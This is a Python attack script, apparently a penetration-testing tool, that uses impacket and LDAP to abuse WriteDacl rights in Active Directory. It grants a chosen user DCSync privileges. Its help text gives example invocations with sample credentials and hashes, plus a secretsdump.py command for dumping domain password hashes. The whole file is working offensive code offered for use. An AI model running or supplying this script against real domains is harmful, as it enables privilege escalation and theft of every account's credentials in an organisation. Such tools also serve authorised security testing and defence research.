#!/usr/bin/env python3
#
# DCSync Attack
# Mostly copypasta from https://github.com/tothi/rbcd-attack
#
import ssl
import sys
import ldap3
import argparse
import ldapdomaindump
from ldap3 import Server, Connection, Tls, SASL, KERBEROS
from impacket import version
from impacket import logging
from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

print(version.BANNER)

parser = argparse.ArgumentParser(add_help=True, description='WriteDacl Attack: To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.')

parser.add_argument('-dc', required=True, action='store', metavar='FQDN', help='FQDN of the Domain Controller')
parser.add_argument('-t', required=True, action='store', metavar='USERNAME', help='Target user to be escalated in format *Distinguished Names*')
parser.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for LDAP auth (instead of password)')
parser.add_argument('identity', action='store', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')
parser.add_argument('-k', action='store_true', help='If you want to use a Kerberos ticket')

str_help = r"""
 Examples:
     DCSync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator:Password123
     DCSync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator -k
     DCSync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL:P@$$w0rd123'
     DCSync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL' -hashes :32693b11e6aa90eb43d32c72a07ceea6

 DCSync Attack:
     secretsdump.py 'n00py.local/spoNge369:passw0rd123!@dc01.n00py.local'

 Search Distinguished Names(DN) of spoNge369:
     pywerview get-netuser -u'any_valid_user' -p'password321$' -t dc01.n00py.local | perl -wnlE'print if/distinguishedname.+spoNge369/'
"""

if len(sys.argv) == 1:
    parser.print_help() 
    print(str_help)
    sys.exit(1)

options = parser.parse_args()

c = NTLMRelayxConfig()
c.addcomputer = 'idk lol'
c.target = options.dc

if options.hashes:
    attackeraccount = options.identity.split(':')
    # support only :NTHASH format (no LM)
    attackerpassword = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[1]).upper()

else:
   attackeraccount = options.identity.split(':')
   attackerpassword = attackeraccount[1]


if options.k: 
    attackeraccount = options.identity.split(':')
    
logger.init()
logging.getLogger().setLevel(logging.INFO)
logging.info('Starting DCSync Attack against {}'.format(options.t))
logging.info('Initializing LDAP connection to {}'.format(options.dc))

if options.k:
    tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
    serv = Server(options.dc, use_ssl=True, tls=tls, get_info=ldap3.ALL)
    conn = Connection(serv, authentication=SASL, sasl_mechanism=KERBEROS)
    conn.bind()

else:

    serv = Server(options.dc, tls=False, get_info=ldap3.ALL)
    logging.info('Using {} account with password ***'.format(attackeraccount[0]))
    conn = Connection(serv, user=attackeraccount[0], password=attackerpassword, authentication=ldap3.NTLM)
    conn.bind()
   
logging.info('LDAP bind OK')

logging.info('Initializing domainDumper()')
cnf = ldapdomaindump.domainDumpConfig()
cnf.basepath = c.lootdir
dd = ldapdomaindump.domainDumper(serv, conn, cnf)

logging.info('Initializing LDAPAttack()')
la = LDAPAttack(c, conn, attackeraccount[0].replace('\\', '/'))
la.aclAttack(options.t, dd)
